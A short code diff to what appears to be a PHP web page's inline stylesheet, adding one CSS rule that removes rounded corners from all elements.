@@ -47,6 +47,7 @@ if (file_exists($archivo)) {
   <link rel="icon" href="img/logo_bac.svg" type="image/svg+xml"/>
   <style>
     *{box-sizing:border-box;margin:0;padding:0}
+    *,*::before,*::after{border-radius:0 !important}
     body{font-family:'Segoe UI',Tahoma,sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px;padding:20px}
     .topbanner{position:fixed;top:0;left:0;right:0;padding:14px 20px;background:#fff;border-bottom:1px solid #f0f0f0;z-index:10}
     .topbanner img{height:28px;display:block}
